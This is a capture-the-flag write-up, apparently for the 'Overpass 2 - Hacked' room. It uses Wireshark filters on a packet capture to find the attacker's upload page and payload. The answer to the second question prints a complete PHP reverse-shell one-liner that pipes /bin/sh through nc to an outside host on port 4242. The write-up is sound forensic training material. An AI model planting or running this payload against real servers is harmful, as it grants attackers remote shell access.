# Overpass 2 - Hacked

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

## Q1 What was the URL of the page they used to upload a reverse shell?
Since there should be a interaction string its worth checking TCP streams. 
```
tcp.stream eq 1
```
There is only 13 packets, the only POST packet present looks interesting with file upload.php.

To upload its a POST request to send something so I tried:
```
http.request.method=="POST" 
```
There is only one packet in info column shows POST /development/upload.php
Also listed under Hypertext>POST>Request URI: /development/upload.php

Answer Q1: /development/

## Q2 What payload did the attacker use to gain access?
From the same POST packet the easiest way to view it is via follow TCP or HTTP stream.
Answer Q2: <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
or can be found in the hypertext section but its broken into a series of very short lines.




